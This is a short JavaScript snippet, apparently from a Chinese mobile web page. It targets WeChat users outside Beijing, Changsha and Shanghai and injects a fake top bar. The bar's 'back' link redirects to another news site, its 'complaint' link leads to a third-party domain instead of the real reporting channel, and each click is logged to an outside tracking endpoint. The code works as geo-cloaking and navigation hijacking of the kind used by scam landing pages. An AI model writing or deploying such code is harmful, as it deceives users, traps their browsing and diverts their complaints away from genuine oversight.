var cityArr=['北京市','长沙市','上海市'];
if(cityArr.indexOf(localAddress.city) ==-1 && localAddress.ismobile==1){
    var div=document.createElement('div');
    var ua = window.navigator.userAgent.toLowerCase();
    var isAndroid = ua.indexOf('android') > -1 || ua.indexOf('adr') > -1;
    var bgColor="#f2f2f2";
    if(!isAndroid){bgColor="#EDEDED"}
    div.innerHTML='<div style="height:40px;"></div><div style="position:fixed;left:0;right:0;top:0;width:100%;z-index:999999999;display:flex;justify-content: space-between;background: '+bgColor+';height:40px;line-height: 40px;"><div style="padding:0 5px;"><a href="javascript:gotoList(1);" style="color:#000;text-decoration:none;">&nbsp;&lt;返回</a></div> <div style="padding:0 10px;"><a href="javascript:gotoList(2);" style="color:#000;text-decoration:none;">投诉</a></div></div>';
    var first=document.body.firstChild;
    if(ua.match(/MicroMessenger/i) == 'micromessenger'){
        document.body.insertBefore(div,first);
    }
}

function gotoList(type){
    var href=location.href,url;
    if(type==1){
    	url='http://live.goldkeynews.com?id=18';
    }else if(type==2){
        url='http://isu.endlesspools.net.cn/xqd/tousu/?url='+href;
    }
    $.get('https://www.jinbaiteng.com/port/api/tsStatisticHy?durl='+href+'&flag='+type);
    setTimeout(function(){
        location.href=url;
    },300)
}